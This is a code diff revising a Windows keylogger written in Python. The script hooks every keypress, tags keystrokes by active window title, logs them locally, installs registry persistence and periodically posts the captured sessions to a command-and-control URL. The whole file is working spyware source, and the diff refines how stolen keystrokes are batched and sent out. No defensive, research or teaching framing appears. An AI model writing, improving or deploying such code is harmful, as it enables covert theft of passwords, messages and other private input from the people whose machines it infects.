@@ -1,97 +1,109 @@
 import logging
 import datetime
-import os
 import threading
 import requests
 from pynput import keyboard
 from pathlib import Path
 from config import C2_URL, SEND_INTERVAL, MACHINE_ID
 from persistence import install, is_installed
-import win32gui  #interacting with the windows gui
-
-# config
-# On Windows: to capture keys when the DESKTOP has focus, run this script as Administrator
-# (UIPI blocks lowlevel hooks for non-elevated processes when Explorer/Desktop is foreground).
+import win32gui
 
 BASE_DIR = Path(__file__).resolve().parent
 LOG_FILE = BASE_DIR / "keylog.txt"
 
-# setup logging
 logging.basicConfig(
     filename=LOG_FILE,
     level=logging.DEBUG,
     format="%(message)s"
 )
 
-# Buffer
-buffer = []
-buffer_lock = threading.Lock()  # prevents race conditions - basically both agent and keylogger access the buffer = no good
+buffer_lock     = threading.Lock()
+sessions        = []     # completed window sessions waiting to be sent
+current_session = None   # {"window": str, "timestamp": str, "keys": list}
 
-# check the active window
+
 def get_active_window():
-    """Returns the title of the currently focused window."""
     try:
         return win32gui.GetWindowText(win32gui.GetForegroundWindow())
-    except:
+    except Exception:
         return "Unknown"
 
-def send_to_c2():
-    """Runs in background, sends buffer to C2 every SEND_INTERVAL seconds."""
-    while True:
-        threading.Event().wait(SEND_INTERVAL) 
 
-        with buffer_lock: #lock the door, do my thing then unlock the door
-            if buffer:
-                data = "".join(buffer)
-                buffer.clear()
-            else:
-                continue
+def send_to_c2():
+    while True:
+        threading.Event().wait(SEND_INTERVAL)
+
+        with buffer_lock:
+            payload = list(sessions)
+            sessions.clear()
+            # include keys from the current (still open) window session
+            if current_session and current_session["keys"]:
+                payload.append({
+                    "window":    current_session["window"],
+                    "timestamp": current_session["timestamp"],
+                    "keys":      "".join(current_session["keys"]),
+                })
+                current_session["keys"] = []  # sent — reset without closing the session
+
+        if not payload:
+            continue
 
         try:
-            requests.post(C2_URL, data={
-                "machine": MACHINE_ID,
-                "data": data
+            requests.post(C2_URL, json={
+                "machine":  MACHINE_ID,
+                "sessions": payload,
             }, timeout=5)
         except requests.exceptions.RequestException:
-            pass  # skbidiy fail if server is unreachable, 
+            pass  # server unreachable — drop and continue
 
-current_window = ""
+
 def on_press(key):
+    global current_session
+
     if key == keyboard.Key.esc:
         return False  # stop listener
 
-    global current_window
-
     active = get_active_window()
-    if active != current_window:
-        current_window = active
-        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        entry = f"\n\n[{timestamp}] Window: {active}\n"
-        logging.info(entry)
-        with buffer_lock:
-            buffer.append(entry)
 
-    try:
-        ch = key.char
-    except AttributeError: #special keys e.g. [Key.space]
-        ch = f"[{key}]"
-
-    logging.info(ch)
     with buffer_lock:
-        buffer.append(ch)
+        # window changed — finalise current session and open a new one
+        if current_session is None or active != current_session["window"]:
+            if current_session and current_session["keys"]:
+                sessions.append({
+                    "window":    current_session["window"],
+                    "timestamp": current_session["timestamp"],
+                    "keys":      "".join(current_session["keys"]),
+                })
+            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            current_session = {"window": active, "timestamp": ts, "keys": []}
+            logging.info(f"\n\n[{ts}] Window: {active}")
 
-# main
+        try:
+            ch = key.char
+        except AttributeError:
+            ch = f"[{key}]"
+
+        logging.info(ch)
+        current_session["keys"].append(ch)
+
+
 def start():
-    if not is_installed(): #install the keylogger to the registry
+    global current_session
+
+    if not is_installed():
         install()
-        
-    # Start sender thread as daemon - *LINUX REFERENCE* (dies when main program exits aka i press esc)
+
+    # seed the first session so the buffer is never None when keys arrive
+    active = get_active_window()
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    current_session = {"window": active, "timestamp": timestamp, "keys": []}
+
     sender = threading.Thread(target=send_to_c2, daemon=True)
     sender.start()
 
-    # Start shell agent thread as daemon - *LINUX REFERENCE* (dies when main program exits aka i press esc)
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
+
 
 if __name__ == "__main__":
     start()
